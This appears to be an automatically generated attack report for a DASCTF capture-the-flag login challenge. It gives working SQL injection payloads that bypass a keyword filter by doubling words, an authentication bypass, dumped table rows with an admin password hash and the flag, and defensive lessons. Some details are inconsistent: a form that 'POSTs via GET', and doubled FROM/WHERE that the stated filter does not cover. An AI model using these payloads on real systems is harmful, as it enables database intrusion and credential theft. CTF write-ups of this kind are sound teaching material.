# Attack Report -- dasctf-login-doublewrite-sqli

**Generated:** 2026-07-17 06:21:57
**Target:** http://23f036b60c9b61df4c2bf85c.http-ctf2.dasctf.com:80

## Target Summary

- **URL/IP:** http://23f036b60c9b61df4c2bf85c.http-ctf2.dasctf.com:80
- **Technologies detected:**
  - OpenResty web app server (nginx + Lua)
  - PHP 7.3.11
  - MariaDB 10.3.18
  - HTML5, inline CSS
- **Open ports:**
  - 80/tcp open http
- **Key HTTP headers:**
  - Server: openresty
  - X-Powered-By: PHP/7.3.11
- **Page:** Chinese login form at index.php, POSTs to check.php via GET method
- **Database:** geek (user: root@localhost)
- **Tables:** b4bsql (8 rows), geekuser (1 row)

## Vulnerability Discovered

- **Type:** SQL Injection (SQLi) — Union-based with keyword filter bypass
- **Location:** check.php?username= parameter (GET method)
- **How it was found:** Manual testing with single quote `'` revealed MariaDB error message exposing SQL syntax details. Subsequent keyword filter analysis revealed that `OR`, `AND`, `BY`, `UNION`, `SELECT` are stripped from input. Double-write bypass (e.g., `OORR` -> `OR` after filter removes inner `OR`) was developed to evade the filter.

## Exploitation Chain

### Step 1: Reconnaissance
- **nmap:** Identified OpenResty web server on port 80
- **whatweb:** Detected PHP 7.3.11, page title "用户登陆" (User Login)
- **curl:** Fetched index page, revealed login form at `check.php` with GET method, parameters `username` and `password`

### Step 2: SQL Injection Discovery
- **Payload:** `admin'` -> Error: "You have an error in your SQL syntax... near 'admin'' at line 1" (MariaDB confirmed)
- **Payload:** `admin'#` -> Login Success! Displayed admin's password hash: `70951dbf907a9a021de25996fc5a02c9`
- Query structure identified: `SELECT * FROM users WHERE username='$input' AND password='$input'`

### Step 3: Keyword Filter Bypass
- Filtered keywords discovered: `OR`, `AND`, `BY`, `UNION`, `SELECT`
- developed double-write bypass technique:
  - `OR` -> `OORR` (filter removes one OR, leaves OR)
  - `AND` -> `AANDND`
  - `BY` -> `BBYY`
  - `UNION` -> `UNIUNIONON`
  - `SELECT` -> `SELESELECTCT`
- Column count: 3 (determined via `ORDER BY` with `OORRDER BBYY`)

### Step 4: Database Enumeration
- **database():** `geek`
- **version():** `10.3.18-MariaDB`
- **user():** `root@localhost`
- **Tables (via information_schema bypass with `infOORRmation_schema`):**
  - `b4bsql` (columns: id, username, password)
  - `geekuser` (columns: id, username, password)

### Step 5: Data Extraction
- **b4bsql table dump:**
  ```
  1:cl4y:i_want_to_play_2077
  2:sql:sql_injection_is_so_fun
  3:porn:do_you_know_pornhub
  4:git:github_is_different_from_pornhub
  5:Stop:you_found_flag_so_stop
  6:badguy:i_told_you_to_stop
  7:hacker:hack_by_cl4y
  8:flag:CTF2{ec2b64-9988-4362-8b08-69c4b6f33a68}
  ```
- **geekuser table dump:**
  ```
  1:admin:70951dbf907a9a021de25996fc5a02c9
  ```

### Key Payloads Used

**Authentication bypass:**
```
admin'#
```

**UNION SELECT with database extraction:**
```
nonexistent' UNIUNIONON SELESELECTCT 1,database(),3%23
```

**Table enumeration (info_schema bypass):**
```
nonexistent' UNIUNIONON SELESELECTCT 1,group_concat(table_name),3 FRFROMOM infOORRmation_schema.tables WHWHEREERE table_schema=database()%23
```

**Column enumeration:**
```
nonexistent' UNIUNIONON SELESELECTCT 1,group_concat(column_name),3 FRFROMOM infOORRmation_schema.columns WHWHEREERE table_name='b4bsql'%23
```

**Data dump (note: `password` -> `passwoorrd` to bypass OR filter):**
```
nonexistent' UNIUNIONON SELESELECTCT 1,group_concat(id,0x3a,username,0x3a,passwoorrd,0x3C62723E),3 FRFROMOM b4bsql%23
```

## Flag(s) Captured

| Flag | Location | Method |
|------|----------|--------|
| `CTF2{ec2b64-9988-4362-8b08-69c4b6f33a68}` | b4bsql table, row id=8 | UNION SELECT with keyword filter bypass |

## Lessons Learned

- **Root cause:** Unsanitized user input in SQL query combined with a naive blacklist-based filter (`OR`, `AND`, `BY`, `UNION`, `SELECT`). The filter used single-pass keyword removal, making it trivially bypassable via character doubling (double-write technique). The filter also corrupted legitimate words (e.g., `password` -> `passwd`), and failed to filter `#` (MySQL comment) which enabled comment-based injection.
- **Defense:** Use parameterized queries (prepared statements) with PDO or MySQLi. Never rely on blacklist-based filtering for SQL injection prevention. If a filter is needed, use recursive filtering or a proper WAF. Disable verbose SQL error messages in production.
- **Dead ends:** The `.git/HEAD` returned HTTP 200 but was a false positive (all paths route to index page). `information_schema` bypass required careful double-write analysis since `OR` appears in the word itself. The `-- ` (double-dash-space) MySQL comment was unreliable due to URL encoding issues; `#` (hash) was more reliable. `password` column name contained `OR` and required `passwoorrd` double-write.

## Files Saved

### recon/
- `service-scan.txt` — nmap service scan
- `whatweb.txt` — web technology fingerprinting
- `headers.txt` — HTTP response headers
- `index-source.html` — login page source
- `union-db.html` — database name extraction
- `union-version.html` — MariaDB version
- `union-user.html` — current database user
- `all-tables.html` — all table names in geek database
- `b4bsql-columns.html` — b4bsql table columns
- `geekuser-columns.html` — geekuser table columns

### exploits/
- `admin-hash.txt` — admin MD5 password hash
- `b4bsql-dump.html` — full b4bsql table dump (contains flag)
- `geekuser-dump.html` — full geekuser table dump

### flags/
- `flag.txt` — captured flag
